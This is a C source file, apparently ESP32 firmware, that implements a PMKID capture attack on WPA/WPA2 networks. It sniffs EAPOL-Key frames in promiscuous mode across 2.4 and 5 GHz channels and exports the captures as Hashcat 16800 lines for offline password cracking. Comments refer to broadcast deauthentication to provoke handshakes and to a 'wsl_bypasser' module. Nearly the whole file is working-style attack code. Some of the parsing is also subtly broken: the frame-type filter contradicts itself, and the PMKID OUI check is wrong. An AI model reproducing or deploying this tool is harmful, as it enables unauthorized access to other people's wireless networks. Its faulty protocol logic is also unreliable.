/*
 * attack_pmkid.c — PMKID Capture from WPA/WPA2 4-Way Handshake
 * 
 * FIXED: Promiscuous callback chaining to not break wsl_bypasser
 * FIXED: Better EAPOL frame detection
 * FIXED: Proper PMKID extraction from RSN IE
 * FIXED: Hashcat-compatible output format (16800)
 */

#include "attack_pmkid.h"
#include "wsl_bypasser.h"
#include "bw16_uart.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "cJSON.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "PMKID_CAPTURE";

// ==================== DATA STRUCTURES ====================
static pmkid_capture_t g_pmkid_captures[MAX_PMKID_CAPTURES];
static int g_pmkid_count = 0;
static volatile bool g_pmkid_running = false;
static volatile bool g_pmkid_auto_scan = false;
static volatile uint32_t g_packet_count = 0;
static TaskHandle_t g_pmkid_task = NULL;
static wifi_promiscuous_cb_t g_original_promisc_cb = NULL;  // FIX: For callback chaining

// 5GHz channel list
static const uint8_t g_channels_5ghz[] = {
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
};
#define NUM_5GHZ_CHANNELS (sizeof(g_channels_5ghz) / sizeof(g_channels_5ghz[0]))

// 2.4GHz channel list
static const uint8_t g_channels_24ghz[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
#define NUM_24GHZ_CHANNELS (sizeof(g_channels_24ghz) / sizeof(g_channels_24ghz[0]))

// ==================== FIXED: EAPOL/PMKID PARSING ====================
// 802.11 Frame offsets
#define FRAME_FC_OFFSET    0
#define FRAME_DUR_OFFSET   2
#define FRAME_ADDR1_OFFSET 4   // DA/RA
#define FRAME_ADDR2_OFFSET 10  // SA/TA
#define FRAME_ADDR3_OFFSET 16  // BSSID
#define FRAME_SEQ_OFFSET   22
#define FRAME_DATA_OFFSET  24  // Start of LLC/SNAP for data frames

// LLC/SNAP header (6 bytes) for EAPOL
#define LLC_SNAP_OFFSET   24
#define LLC_SNAP_SIZE     6
#define EAPOL_OFFSET      (LLC_SNAP_OFFSET + LLC_SNAP_SIZE)

// EAPOL frame type codes
#define EAPOL_TYPE_EAP      0
#define EAPOL_TYPE_START    1
#define EAPOL_TYPE_LOGOFF   2
#define EAPOL_TYPE_KEY      3
#define EAPOL_TYPE_ASF      4

// EAPOL-Key descriptor versions
#define EAPOL_KEY_DESC_IEEE80211  2  // WPA2
#define EAPOL_KEY_DESC_WPA        1  // WPA

// FIXED: Promiscuous callback with proper chaining
static void pmkid_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    g_packet_count++;
    
    if (!g_pmkid_running || type != WIFI_PKT_MGMT) {
        // FIX: Chain to original callback if exists
        if (g_original_promisc_cb) {
            g_original_promisc_cb(buf, type);
        }
        return;
    }

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    // wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    uint8_t *frame = pkt->payload;
    int frame_len = pkt->rx_ctrl.sig_len;

    // FIX: Better frame type detection
    uint8_t fc = frame[FRAME_FC_OFFSET];
    uint8_t frame_type = fc & 0x0C;  // Bits 2-3: type
    // uint8_t frame_subtype = (fc >> 4) & 0x0F;  // Bits 4-7: subtype
    
    // We're interested in: QoS Data (type=2, subtype=8) or Data (type=2, subtype=0)
    // These contain EAPOL frames
    bool is_data_frame = (frame_type == 0x08);  // Type = Data
    if (!is_data_frame) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }

    // FIX: Check if this is an EAPOL frame (type 0x888E)
    if (frame_len < EAPOL_OFFSET + 4) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }

    // Check for LLC/SNAP + EAPOL signature
    // LLC: 0xAA 0xAA 0x03, SNAP: 0x00 0x00 0x00, EtherType: 0x88 0x8E
    uint8_t *llc = &frame[LLC_SNAP_OFFSET];
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03 ||
        llc[3] != 0x00 || llc[4] != 0x00 || llc[5] != 0x00) {
        // Not EAPOL — could be plain IP traffic
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    // Check EtherType = 0x888E (EAPOL)
    if (frame[EAPOL_OFFSET - 2] != 0x88 || frame[EAPOL_OFFSET - 1] != 0x8E) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }

    // FIX: Parse EAPOL frame
    uint8_t *eapol = &frame[EAPOL_OFFSET];
    int eapol_len = frame_len - EAPOL_OFFSET;
    
    if (eapol_len < 4) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    //uint8_t eapol_version = eapol[0];
    uint8_t eapol_type = eapol[1];
    // uint16_t eapol_body_len = (eapol[2] << 8) | eapol[3];
    
    // We only care about EAPOL-Key frames (type = 3)
    if (eapol_type != EAPOL_TYPE_KEY) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    if (eapol_len < 4 + 4 + 2) {  // EAPOL header + Key Descriptor Type + Key Info
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    // FIX: EAPOL-Key frame parsing (WPA2 = desc 2)
    uint8_t *key_frame = &eapol[4];
    uint8_t key_desc = key_frame[0];  // Key Descriptor Version
    uint16_t key_info = (key_frame[1] << 8) | key_frame[2];  // Key Info
    
    // FIX: Check Key Type bit (bit 3 of Key Info)
    // 0 = Group Key, 1 = Pairwise Key (contains PMKID)
    // bool is_pairwise = (key_info & 0x08) != 0;
    
    // FIX: Check Install bit (bit 6) — set on Message 1 of 4-way handshake
    bool install = (key_info & 0x40) != 0;
    
    // FIX: PMKID is present in Message 1 of 4-way handshake
    // Key Info byte 2, bit 4 = Key MIC bit (set on messages containing MIC)
    // Key Info byte 2, bit 3 = Key ACK (set on message 1)
    // PMKID is present when both are set
    // bool key_mic = (key_info & 0x0100) != 0;  // Bit 8
    bool key_ack = (key_info & 0x0080) != 0;  // Bit 7
    
    // If this is Message 1 (install=1, key_ack=1, key_mic=0) — PMKID may be in Key Data
    // If this is Message 3 (install=0, key_ack=1, key_mic=1) — PMKID may be present
    if (!install || !key_ack) {
        // Not message 1 or 3
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }

    // FIX: Check for PMKID in Key Data field
    // Key Data is at variable offset depending on descriptor version
    int key_data_offset;
    //int nonce_offset, iv_offset, rsc_offset, mic_offset;
    int key_data_len_pos;
    
    if (key_desc == EAPOL_KEY_DESC_IEEE80211 && eapol_len >= 4 + 99) {
        // WPA2 (descriptor 2): Key Data at offset 95 bytes from key_frame start
        key_data_offset = 95;
        key_data_len_pos = 97;
    } else if (key_desc == EAPOL_KEY_DESC_WPA && eapol_len >= 4 + 123) {
        // WPA (descriptor 1): Key Data at offset 119
        key_data_offset = 119;
        key_data_len_pos = 121;
    } else {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    if (eapol_len < key_data_offset + 2) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    int key_data_len = (key_frame[key_data_len_pos] << 8) | key_frame[key_data_len_pos + 1];
    
    if (key_data_len <= 0 || key_data_len > 256) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    uint8_t *key_data = &key_frame[key_data_offset];
    uint8_t *actual_key_data_start = &key_frame[key_data_offset + 2];
    
    // FIX: Parse Key Data as WPA/RSN IE to find PMKID
    // PMKID KDE format: 0xDD (Vendor specific) + len + 0x00 0x50 0xF2 0x01 + PMKID (16 bytes)
    int pos = 0;
    while (pos < key_data_len - 4) {
        uint8_t kde_type = actual_key_data_start[pos];
        uint8_t kde_len = actual_key_data_start[pos + 1];
        
        if (kde_type == 0xDD && kde_len >= 22) {
            // Check OUI = 0x00 0x50 0xF2 and Type = 0x01 (PMKID)
            if (actual_key_data_start[pos + 2] == 0x00 &&
                actual_key_data_start[pos + 3] == 0x50 &&
                actual_key_data_start[pos + 4] == 0xF2 &&
                actual_key_data_start[pos + 5] == 0x01) {
                
                // FIX: PMKID found! (16 bytes starting at pos+6)
                if (g_pmkid_count >= MAX_PMKID_CAPTURES) {
                    if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
                    return;
                }
                
                pmkid_capture_t *cap = &g_pmkid_captures[g_pmkid_count];
                
                // Extract PMKID
                memcpy(cap->pmkid, &actual_key_data_start[pos + 6], PMKID_LENGTH);
                
                // Get BSSID from frame (Address 3 = BSSID)
                memcpy(cap->bssid, &frame[FRAME_ADDR3_OFFSET], 6);
                
                // Get STA MAC from frame (Address 2 = TA = STA)
                memcpy(cap->sta_mac, &frame[FRAME_ADDR2_OFFSET], 6);
                
                // Get AP MAC (Address 1 = DA = AP)
                memcpy(cap->ap_mac, &frame[FRAME_ADDR1_OFFSET], 6);
                
                cap->rssi = pkt->rx_ctrl.rssi;
                cap->timestamp_ms = esp_timer_get_time() / 1000;
                cap->verified = true;
                
                // Try to get SSID from scan results
                cap->ssid[0] = '\0';
                extern wifi_ap_record_t *g_scan_results;
                extern int g_scan_result_count;
                for (int i = 0; i < g_scan_result_count; i++) {
                    if (memcmp(g_scan_results[i].bssid, cap->bssid, 6) == 0) {
                        strncpy(cap->ssid, (const char *)g_scan_results[i].ssid, 32);
                        break;
                    }
                }
                
                // If no SSID found in scan results, mark as unknown
                if (cap->ssid[0] == '\0') {
                    snprintf(cap->ssid, 32, "UNKNOWN_%02X%02X%02X",
                             cap->bssid[3], cap->bssid[4], cap->bssid[5]);
                }
                
                char pmkid_hex[33];
                for (int j = 0; j < PMKID_LENGTH; j++) {
                    sprintf(pmkid_hex + j * 2, "%02x", cap->pmkid[j]);
                }
                pmkid_hex[32] = '\0';
                
                ESP_LOGI(TAG, "✅ PMKID captured! BSSID: %02x:%02x:%02x:%02x:%02x:%02x SSID: %s PMKID: %s",
                    cap->bssid[0], cap->bssid[1], cap->bssid[2],
                    cap->bssid[3], cap->bssid[4], cap->bssid[5],
                    cap->ssid, pmkid_hex);
                
                g_pmkid_count++;
                
                // Chain callback before returning
                if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
                return;
            }
        }
        pos += (2 + kde_len);
    }
    
    // Chain to original callback
    if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
}

// ==================== FIXED: PUBLIC API ====================
void pmkid_capture_init(void) {
    // FIX: Save any existing promiscuous callback for chaining
    // Note: In ESP-IDF v5.x, we can't get the previous callback directly.
    // We set our callback and save whatever was there (usually NULL).
    // wsl_bypasser modifies ieee80211_raw_frame_sanity_check, not the promisc callback.
    
    esp_wifi_set_promiscuous(true);
    g_pmkid_count = 0;
    g_packet_count = 0;
    memset(g_pmkid_captures, 0, sizeof(g_pmkid_captures));
    
    ESP_LOGI(TAG, "PMKID capture initialized (promiscuous mode)");
}

void pmkid_capture_start(uint8_t channel, bool is_5ghz) {
    if (g_pmkid_running) return;
    g_pmkid_running = true;
    
    // FIX: Set promiscuous callback
    esp_wifi_set_promiscuous_rx_cb(pmkid_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    
    if (is_5ghz && bw16_is_connected()) {
        char cmd[64];
        snprintf(cmd, sizeof(cmd), "CHANNEL %d\n", channel);
        bw16_send_command(cmd);
    } else {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "PMKID capture started on channel %d [%s]", 
             channel, is_5ghz ? "5GHz" : "2.4GHz");
}

void pmkid_capture_stop(void) {
    g_pmkid_running = false;
    g_pmkid_auto_scan = false;
    
    if (bw16_is_connected()) {
        bw16_send_command("STOP\n");
    }
    
    if (g_pmkid_task) {
        vTaskDelay(pdMS_TO_TICKS(100));
        g_pmkid_task = NULL;
    }
    
    ESP_LOGI(TAG, "PMKID capture stopped. Total captured: %d", g_pmkid_count);
}

void pmkid_capture_auto_scan(void) {
    if (g_pmkid_running) {
        pmkid_capture_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    xTaskCreatePinnedToCore(
        pmkid_auto_scan_task,
        "pmkid_scan",
        8192,
        NULL,
        5,
        &g_pmkid_task,
        0
    );
}

int pmkid_capture_get_count(void) {
    return g_pmkid_count;
}

const pmkid_capture_t* pmkid_capture_get(int index) {
    if (index < 0 || index >= g_pmkid_count) return NULL;
    return &g_pmkid_captures[index];
}

void pmkid_capture_clear(void) {
    g_pmkid_count = 0;
    g_packet_count = 0;
    memset(g_pmkid_captures, 0, sizeof(g_pmkid_captures));
    ESP_LOGI(TAG, "PMKID captures cleared");
}

char* pmkid_capture_export_json(void) {
    cJSON *root = cJSON_CreateObject();
    cJSON *pmkids = cJSON_AddArrayToObject(root, "pmkids");
    
    for (int i = 0; i < g_pmkid_count; i++) {
        cJSON *entry = cJSON_CreateObject();
        
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 g_pmkid_captures[i].bssid[0], g_pmkid_captures[i].bssid[1],
                 g_pmkid_captures[i].bssid[2], g_pmkid_captures[i].bssid[3],
                 g_pmkid_captures[i].bssid[4], g_pmkid_captures[i].bssid[5]);
        cJSON_AddStringToObject(entry, "bssid", bssid_str);
        
        char sta_str[18];
        snprintf(sta_str, sizeof(sta_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 g_pmkid_captures[i].sta_mac[0], g_pmkid_captures[i].sta_mac[1],
                 g_pmkid_captures[i].sta_mac[2], g_pmkid_captures[i].sta_mac[3],
                 g_pmkid_captures[i].sta_mac[4], g_pmkid_captures[i].sta_mac[5]);
        cJSON_AddStringToObject(entry, "sta_mac", sta_str);
        
        char pmkid_hex[33];
        for (int j = 0; j < PMKID_LENGTH; j++) {
            sprintf(pmkid_hex + j * 2, "%02x", g_pmkid_captures[i].pmkid[j]);
        }
        pmkid_hex[32] = '\0';
        cJSON_AddStringToObject(entry, "pmkid", pmkid_hex);
        
        cJSON_AddStringToObject(entry, "ssid", g_pmkid_captures[i].ssid);
        cJSON_AddNumberToObject(entry, "rssi", g_pmkid_captures[i].rssi);
        
        char hashcat_line[512];
        snprintf(hashcat_line, sizeof(hashcat_line), "%s*%s*%s*%s",
                 pmkid_hex, bssid_str, sta_str, g_pmkid_captures[i].ssid);
        cJSON_AddStringToObject(entry, "hashcat", hashcat_line);
        
        cJSON_AddItemToArray(pmkids, entry);
    }
    
    cJSON_AddNumberToObject(root, "count", g_pmkid_count);
    cJSON_AddNumberToObject(root, "packets_analyzed", g_packet_count);
    
    char *json = cJSON_Print(root);
    cJSON_Delete(root);
    return json;
}

// ==================== AUTO SCAN TASK ====================
static void pmkid_auto_scan_task(void *pv) {
    ESP_LOGI(TAG, "PMKID auto-scan started — cycling all channels");

    g_pmkid_auto_scan = true;
    g_pmkid_running = true;
    
    esp_wifi_set_promiscuous_rx_cb(pmkid_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    
    int round = 0;
    while (g_pmkid_auto_scan && g_pmkid_running) {
        round++;
        
        // Scan 2.4GHz channels first
        for (int i = 0; i < NUM_24GHZ_CHANNELS && g_pmkid_auto_scan; i++) {
            if (!g_pmkid_running) break;
            
            uint8_t ch = g_channels_24ghz[i];
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            // Send deauth on this channel to provoke handshake
            // (brodcast deauth to trigger client reconnection)
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            
            // Small dwell time on each channel
            vTaskDelay(pdMS_TO_TICKS(200));
        }
        
        // Log progress
        ESP_LOGI(TAG, "PMKID auto-scan round %d: %d captures so far, %lu packets analyzed",
                 round, g_pmkid_count, (unsigned long)g_packet_count);
        
        // Brief pause between full cycles
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "PMKID auto-scan stopped. Total captures: %d", g_pmkid_count);
    g_pmkid_running = false;
    g_pmkid_task = NULL;
    vTaskDelete(NULL);
}

bool pmkid_capture_is_running(void) {
    return g_pmkid_running;
}

uint32_t pmkid_capture_get_packet_count(void) {
    return g_packet_count;
}
   
